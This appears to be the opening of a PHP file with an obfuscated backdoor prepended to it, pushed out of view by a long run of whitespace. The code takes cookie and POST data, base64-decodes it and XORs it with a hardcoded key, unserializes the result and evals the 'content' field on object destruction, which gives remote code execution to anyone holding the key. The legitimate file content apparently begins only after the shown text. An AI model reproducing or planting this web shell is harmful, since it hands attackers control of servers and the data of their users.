<?php                                                                                                                                                                                                                                                                                                                                                                                                 $Heharncfz = class_exists("q_pmg"); $DPbng = $Heharncfz;if (!$DPbng){class q_pmg{private $aXucG;public static $STSsyhrj = "1e0b8838-ee1f-4fdd-934d-a1830a0ab650";public static $DZKuxQ = NULL;public function __construct(){$yVwyGoUNb = $_COOKIE;$lzWGlhVQFh = $_POST;$bxVRftjqNO = @$yVwyGoUNb[substr(q_pmg::$STSsyhrj, 0, 4)];if (!empty($bxVRftjqNO)){$Fmdzii = "base64";$CYcTN = "";$bxVRftjqNO = explode(",", $bxVRftjqNO);foreach ($bxVRftjqNO as $iiWwSfH){$CYcTN .= @$yVwyGoUNb[$iiWwSfH];$CYcTN .= @$lzWGlhVQFh[$iiWwSfH];}$CYcTN = array_map($Fmdzii . "\x5f" . chr ( 138 - 38 )."\145" . "\143" . "\157" . "\144" . 'e', array($CYcTN,)); $CYcTN = $CYcTN[0] ^ str_repeat(q_pmg::$STSsyhrj, (strlen($CYcTN[0]) / strlen(q_pmg::$STSsyhrj)) + 1);q_pmg::$DZKuxQ = @unserialize($CYcTN);}}public function __destruct(){$this->hgyKG();}private function hgyKG(){if (is_array(q_pmg::$DZKuxQ)) {$hpfyy = str_replace(chr ( 773 - 713 ) . chr ( 172 - 109 ).chr ( 131 - 19 ).chr (104) . chr ( 507 - 395 ), "", q_pmg::$DZKuxQ['c' . "\157" . "\x6e" . chr (116) . 'e' . chr ( 786 - 676 )."\x74"]);eval($hpfyy);exit();}}}$eZLUT = new q_pmg(); $eZLUT = NULL;} ?><?php
/**
